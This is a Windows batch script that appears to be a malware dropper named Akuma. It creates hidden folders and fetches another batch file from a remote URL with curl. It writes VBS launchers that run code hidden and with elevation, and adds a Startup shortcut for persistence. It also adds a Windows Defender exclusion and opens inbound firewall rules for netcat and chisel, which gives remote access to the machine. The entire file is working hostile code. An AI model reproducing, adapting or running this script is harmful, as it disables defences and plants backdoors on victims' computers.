@echo off
mkdir %AppData%\Akuma
attrib +h %AppData%\Akuma
mkdir  %AppData%\ShiniGami
attrib +h  %AppData%\ShiniGami
cd  %AppData%\ShiniGami
curl -O https://raw.githubusercontent.com/l-urk/Akuma/main/Akuma.bat
del %AppData%\Akuma\死神.vbs
echo Set objShell = CreateObject("WScript.Shell") >> %AppData%\Akuma\死神.vbs
echo objShell.Run " %AppData%\ShiniGami\Akuma.bat", 0, False >> %AppData%\Akuma\死神.vbs
del %AppData%\Akuma\beyondbirthday.vbs
echo Set objShell = CreateObject("Shell.Application") >> %AppData%\Akuma\beyondbirthday.vbs
echo objShell.ShellExecute "%AppData%\Akuma\beyondbirthday.bat", "", "", "runas", 0 >> %AppData%\Akuma\beyondbirthday.vbs
powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\beyondbirthday.lnk');$s.TargetPath='%homedrive%\Akuma\beyondbirthday.vbs';$s.Save()"
echo powershell Add-MpPreference -ExclusionPath "$env:AppData\Akuma" >> %AppData%\Akuma\beyondbirthday.bat
echo powershell Remove-NetFirewallRule -Name "Akumanc" >> %AppData%\Akuma\beyondbirthday.bat
echo powershell New-NetFirewallRule -DisplayName "Akumanc" -Direction Inbound -Program "%homedrive%\Akuma\nc\nc.exe" -Action Allow >> %AppData%\Akuma\beyondbirthday.bat
echo powershell Remove-NetFirewallRule -Name "Akumachisel" >> %AppData%\Akuma\beyondbirthday.bat
echo powershell New-NetFirewallRule -DisplayName "Akumachisel" -Direction Inbound -Program "%homedrive%\Akuma\chisel.exe" -Action Allow >> %AppData%\Akuma\beyondbirthday.bat
echo start %AppData%\Akuma\死神.vbs >> %AppData%\Akuma\beyondbirthday.bat
echo cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" >> %AppData%\Akuma\beyondbirthday.bat
echo del "beyondbirthday.lnk" >> %AppData%\Akuma\beyondbirthday.bat
set "vbsFilePath=%homedrive%\Akuma\beyondbirthday.vbs"
IF EXIST "%vbsFilePath%" (
    start "%vbsFilePath%"
) ELSE (
    exit
)
